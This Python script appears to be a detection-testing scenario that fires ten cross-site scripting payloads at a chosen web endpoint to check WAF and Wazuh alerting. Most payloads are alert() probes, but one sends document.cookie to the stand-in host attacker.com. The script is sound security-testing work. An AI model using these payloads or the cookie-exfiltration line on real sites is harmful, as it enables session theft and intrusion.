#!/usr/bin/env python3
"""
Scenario 7: Cross-Site Scripting (XSS) Attack
- Difficulty: Intermediate
- Detection: WAF, Wazuh, Web logs
- Expected Alert: XSS payload detection, script injection alert
"""

import sys
import argparse
import logging
import requests
import time
from urllib.parse import urljoin, quote

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class XSSAttackScenario:
    def __init__(self, target, endpoint='/api/search', verbose=False):
        self.target = target if target.startswith('http') else f"http://{target}"
        self.endpoint = endpoint
        self.verbose = verbose
        self.attempts = 0
        self.results = {
            'scenario': 'XSS_ATTACK',
            'target': target,
            'endpoint': endpoint,
            'attempts': 0,
            'status': 'pending'
        }

    def create_xss_payloads(self):
        """XSS payload variations"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(\"XSS\")'>",
            "<svg onload=alert('XSS')>",
            "<body onload='alert(\"XSS\")'>",
            "<input onfocus='alert(\"XSS\")' autofocus>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<marquee onstart='alert(\"XSS\")'></marquee>",
            "<details open ontoggle='alert(\"XSS\")'>",
            "';alert('XSS');//",
            "<img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'>",
        ]
        return payloads

    def launch_xss_attacks(self):
        """Launch XSS attacks"""
        logger.info(f"[*] Starting XSS Attack against {self.target}{self.endpoint}")

        payloads = self.create_xss_payloads()
        logger.info(f"[*] Total payloads to test: {len(payloads)}")

        start_time = time.time()

        try:
            for payload in payloads:
                self.attempts += 1

                # Try as query parameter
                params = {
                    'q': payload,
                    'search': payload
                }

                # Try as cookie
                cookies = {
                    'user_input': payload
                }

                try:
                    # GET request with payload in query
                    logger.info(f"[+] Attempt {self.attempts}: Testing XSS payload in query string")
                    response = requests.get(
                        urljoin(self.target, self.endpoint),
                        params=params,
                        cookies=cookies,
                        timeout=5,
                        verify=False
                    )

                    # Check if payload is reflected in response
                    if payload in response.text or '<script>' in response.text:
                        logger.warning(f"[!] XSS vulnerability detected: payload reflected in response")

                    # POST request with payload
                    logger.info(f"[+] Attempt {self.attempts}: Testing XSS payload in POST body")
                    response = requests.post(
                        urljoin(self.target, self.endpoint),
                        data={'comment': payload},
                        timeout=5,
                        verify=False
                    )

                    if payload in response.text:
                        logger.warning(f"[!] XSS vulnerability detected: stored XSS potential")

                    time.sleep(0.5)

                except requests.exceptions.RequestException as e:
                    if self.verbose:
                        logger.warning(f"[-] Request error: {e}")

        except KeyboardInterrupt:
            logger.info("\n[!] XSS attacks interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        elapsed = time.time() - start_time
        self.results['attempts'] = self.attempts
        self.results['duration'] = elapsed
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log XSS attack results"""
        logger.info("\n" + "="*60)
        logger.info("XSS ATTACK RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}{self.endpoint}")
        logger.info(f"Total Attempts: {self.attempts}")
        logger.info(f"Duration: {self.results.get('duration', 0):.2f}s")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - WAF: Check XSS detection rules (script tags, event handlers)")
        logger.info("  - Wazuh: Search for 'XSS' or 'script injection' alerts")
        logger.info("  - Application logs: Review request payloads")
        logger.info("  - Browser: Check for unescaped output rendering")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='Cross-Site Scripting (XSS) Attack Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 07_xss_attack.py --target 10.10.10.10:8080 --endpoint /api/search
  python 07_xss_attack.py --target http://192.168.1.100 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target URL or IP:port')
    parser.add_argument('--endpoint', default='/api/search', help='Target endpoint')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Suppress SSL warnings
    requests.packages.urllib3.disable_warnings()

    scenario = XSSAttackScenario(
        target=args.target,
        endpoint=args.endpoint,
        verbose=args.verbose
    )

    scenario.launch_xss_attacks()

if __name__ == '__main__':
    main()
